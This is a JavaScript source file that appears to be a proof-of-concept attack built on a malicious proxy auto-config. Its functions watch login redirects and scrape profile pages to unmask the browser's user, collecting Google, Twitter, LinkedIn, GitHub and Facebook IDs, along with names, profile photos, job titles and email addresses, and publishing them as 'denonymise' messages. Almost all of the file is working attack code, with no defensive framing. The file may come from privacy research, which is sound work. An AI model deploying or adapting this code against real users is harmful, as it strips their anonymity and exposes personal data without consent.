function deanonymise(pac) {
  pac.resetPacState();
  do_google(pac);
  do_twitter(pac);
  do_linkedin(pac);
  do_github(pac);
  do_facebook(pac);
}

// Get Facebook user ID
function do_facebook(pac) {
  pac.addRequestHandler("https://www.facebook.com/me", /^https:\/\/www.facebook.com\/([a-z0-9\.]+)$/, function(pac, url, result) {
    var username = result[1];
    if (username == 'favicon.ico') return; // not a username!
    console.log("facebook username", username);
    pac.publishMsg("denonymise", { service: "facebook.com", attribute: "id", value: username});
    // Couldn't get this working in time
    // /^https:\/\/scontent[^/]+\.fbcdn\.net\/.*jpg/
    /*pac.addRequestPrerenderHandler("https://www.facebook.com/" + username + "/photos", /scontent/ , 10, function(pac, url) {
        console.log("facebook photo", url);
        pac.publishMsg("denonymise", { service: "facebook.com", attribute: "photourl", value: url});
    });*/
  });
}

// Get Twitter handle and profile picture
function do_twitter(pac) {
   pac.addRequestPrerenderHandler("https://twitter.com/lists", /^https:\/\/twitter.com\/(i\/profiles\/show\/|login\?redirect_after_login)/, 1, function(pac, url) {
    if (twitter_id = url.match(/show\/([^/]+)/)) {
      twitter_id = twitter_id[1];
      console.log("twitter_id: " + twitter_id);
      pac.publishMsg("denonymise", { service: "twitter.com", attribute: "id", value: twitter_id });

      pac.scrapeUrl("https://twitter.com/" + twitter_id, { regex: /ProfileAvatar-image \" src=\"([^"]+)\"/ }, function(pac, data) {
          var profile_img = data.data[0];
          if (typeof profile_img != 'undefined') {
            pac.publishMsg("denonymise", { service: "twitter.com", attribute: "profileimg", value: profile_img });
          }
      });
    }
  });
}

// Get Google user ID, full name, profile picture, email address and a handful of photos
function do_google(pac) {
  pac.addRequestHandler("https://plus.google.com/me/posts", /^https:\/\/(accounts.google.com\/ServiceLogin|plus.google.com\/[0-9]+\/posts)/, function(pac, url) {
    if (google_id = url.match(/\/([0-9]+)\/posts/)) {
      google_id = google_id[1];
      console.log("google_id: " + google_id);
      pac.publishMsg("denonymise", { service: "google.com", attribute: "id", value: google_id });

      pac.scrapeUrl("https://plus.google.com/" + google_id + "/posts", function(pac, data) {
          var html = data.data[0];
          var m = html.match(/<title[^>]*>([^-]+) - Google\+/)
          if (m) {
            pac.publishMsg("denonymise", { service: "google.com", attribute: "name", value: m[1] });
          }

          m = html.match(/img src=\"([^\"]+)\" alt=\"Profile photo\"/);
          if (m) {
            pac.publishMsg("denonymise", { service: "google.com", attribute: "profileimg", value: m[1] });
          }          
      });

      // this doesn't seem to work for some accounts
      pac.scrapeUrl("https://code.google.com/u/" + google_id, { regex:  RegExp("<a href=\"/u/" + google_id + "/\"[^>]+>([^<]+)</a>") }, function(pac, data) {
        if (typeof data.data[0] != 'undefined') {
          pac.publishMsg("denonymise", { service: "google.com", attribute: "email", value: data.data[0] });
        };
      });
    }
  });

  pac.addRequestPrerenderHandler("https://drive.google.com/drive/photos", /^https:\/\/[^.]+\.googleusercontent.com\/.*w200-h200-p-k-nu/, 10, function(pac, url) {
    console.log("google_photos:" + url);
    pac.publishMsg("denonymise", { service: "google.com", attribute: "photourl", value: url});
  });

}

// Get LinkedIn user ID and job title
function do_linkedin(pac) {
  pac.addRequestPrerenderHandler("https://www.linkedin.com/profile/view", /www.linkedin.com(\/uas\/login|%2Fin%2F)/, 1, function(pac, url) {
    if (linkedin_id = url.match(/www.linkedin.com%2Fin%2F([^%]+)/)) {
      linkedin_id = linkedin_id[1];
      console.log("linkedin_id: " + linkedin_id);
      pac.publishMsg("denonymise", { service: "linkedin.com", attribute: "id", value: linkedin_id });

      pac.scrapeUrl("https://www.linkedin.com/in/" + linkedin_id, { regex: /data-section=\"headline\">(.*?)<\/p>/ }, function(pac, data) {
          employment = data.data[0]
          if (typeof employment != 'undefined') {
            pac.publishMsg("denonymise", { service: "linkedin.com", attribute: "employment", value: employment });
          }
      });
    }
  });
}

// Get GitHub user ID
function do_github(pac) {
  pac.addRequestPrerenderHandler("https://github.com", /^https:\/\/collector.githubapp.com\/github\/page_view/, 1, function(pac, url) {
    if (github_id = url.match(/\[actor_login\]=([^&]+)/)) {
      github_id = github_id[1];
      console.log("github_id:" + github_id);
      pac.publishMsg("denonymise", { service: "github.com", attribute: "id", value: github_id });
    }
  });
}

